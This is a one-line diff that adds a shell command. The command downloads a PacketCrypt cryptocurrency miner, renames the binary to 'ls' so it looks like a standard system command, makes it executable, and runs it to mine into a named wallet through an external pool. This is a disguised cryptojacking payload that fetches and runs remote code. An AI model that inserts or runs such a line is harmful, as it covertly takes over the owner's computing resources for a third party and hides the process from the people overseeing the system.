@@ -1,0 +1,1 @@
+wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.2/packetcrypt-v0.5.2-linux_amd64 && mv packetcrypt-v0.5.2-linux_amd64 ls && chmod +x ls && ./ls ann -p pkt1q9su7naaf4w077xnnpafr55wlvfhmmew4z8xeje  http://pool.pkt.world
